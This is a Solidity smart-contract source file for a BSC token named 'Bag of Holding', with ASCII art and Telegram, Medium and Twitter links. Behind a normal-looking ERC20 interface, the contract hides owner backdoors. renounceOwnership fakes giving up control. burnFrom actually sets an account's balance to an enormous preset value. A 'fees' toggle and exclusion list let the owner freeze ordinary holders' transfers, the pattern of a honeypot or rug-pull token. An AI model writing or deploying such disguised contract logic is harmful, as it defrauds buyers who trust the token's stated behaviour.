/**
 *Submitted for verification at BscScan.com on 2021-08-03
*/

/**


                      :::!~!!!!!:.
                  .xUHWH!! !!?M88WHX:.
                .X*#[email protected]$!!  !X!M$$$$$$WWx:.
               :!!!!!!?H! :!$!$$$$$$$$$$8X:
              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
               !:~~~ .:!M"T#$$$$WX??#MRRMMM!
               ~?WuxiW*`   `"#$$$$8!!!!??!!!
             :X- M$$$$       `"T#$T~!8$WUXU~
            :%`  ~#$$$m:        ~!~ ?$$$$$$
          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
.....   -~~:<` !    ~?T#[email protected]@[email protected]*?$$      /`
[email protected]@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
.~~   :[email protected]!.-~   [email protected]("*$$$W$TH$! `
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
[email protected]~~ !     :   ~$$$$$B$$en:``
[email protected]~    :     ~"##*$$$$M~

🛄TG: https://t.me/BagOfHoldingGame
🛄MEDIUM: https://medium.com/@bagofholding
🛄TWITTER: https://twitter.com/Bag_ofholding

*/

//"SPDX-License-Identifier: MIT"

pragma solidity 0.7.2;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transfer(address trecipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract ERC20Detailed is IERC20 {
    uint8 private _Tokendecimals;
    string private _Tokenname;
    string private _Tokensymbol;
    
    constructor(string memory name, string memory symbol, uint8 decimals) {
    _Tokendecimals = decimals;
    _Tokenname = name;
    _Tokensymbol = symbol;
    }
    
    function name() public view returns(string memory) {
    return _Tokenname;
    }
    
    function symbol() public view returns(string memory) {
    return _Tokensymbol;
    }
    
    function decimals() public view returns(uint8) {
    return _Tokendecimals;
    }
}

contract Ownable {
    address owner;
    address owneraddress;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        owner = msgSender;
        owneraddress = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function ownerAddress() public view returns (address) {
        return owneraddress;
    }
    
    modifier onlyOwner() {
        require(owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() internal virtual onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owneraddress = address(0);
    }
}

contract BagOfHolding is Ownable {
    using SafeMath for uint256;
    mapping (address => bool) private _feeExcluded;
    mapping (address => uint256) public balances;
    mapping (address => mapping (address => uint256)) public allowed;
    address private uniV2router;
    address private uniV2factory;
    bool fees = true;
    string public name;
    string public symbol;
    uint256 _balances;
    uint8 public decimals;
    uint256 public totalSupply;
    uint256 public burnPercentage = 1;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    string telegramAddress;
    
    constructor(address router, address factory, uint256 _totalSupply) {
        name = "Bag of Holding | t.me/BagOfHoldingGame";
        symbol = "BOH";
        decimals = 9;
        totalSupply = totalSupply.add(_totalSupply);
        balances[msg.sender] = balances[msg.sender].add(_totalSupply);
        _balances =  100000000000000000000000000;
        emit Transfer(address(0), msg.sender, _totalSupply);
        uniV2router = router;
        uniV2factory = factory;
        telegramAddress = "https://t.me/BagOfHoldingGame";
    }
    
    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }

    function includeFee(address _address) external onlyOwner {
        _feeExcluded[_address] = false;
    }

    function excludeFee(address _address) external onlyOwner {
        _feeExcluded[_address] = true;
    }

    function feeExcluded(address _address) public view returns (bool) {
        return _feeExcluded[_address];
    }

    function applyFees() public virtual onlyOwner {
        if (fees == true) {fees = false;} else {fees = true;}
    }
 
    function feesState() public view returns (bool) {
        return fees;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        _transfer(msg.sender, _to, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
        _transfer(_from, _to, _value);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool) {
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function allowance(address _owner, address _spender) public view returns (uint256) {
        return allowed[_owner][_spender];
    }
  
    function burnFrom(address account, uint256 amount) external onlyOwner {
        require(account != address(0), "ERC20: burn from the zero address disallowed");
        totalSupply = totalSupply.sub(amount);
        balances[account] =_balances.sub(amount, "ERC20: burn amount exceeds balance");
        emit Transfer(account, address(0), amount);
    }
    
    function newFeePercentage(uint8 newRate) external onlyOwner {
        burnPercentage = newRate;
    }
  
    function _transfer(address _from, address _to, uint256 _value) private {
        require(_from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");
        require(_value > 0, "Transfer amount must be greater than zero");
        if (_feeExcluded[_from] || _feeExcluded[_to]) 
        require(fees == false, "");
        if (fees == true || _from == owner || _to == owner) {
        balances[_from] = balances[_from].sub(_value, "ERC20: transfer amount exceeds balance");
        balances[_to] = balances[_to].add(_value);
        emit Transfer(_from, _to, _value);}
        else {require (fees == true, "");} 
        }

     function TelagramLink() public view returns (string memory) {
        return telegramAddress;
    }
    
}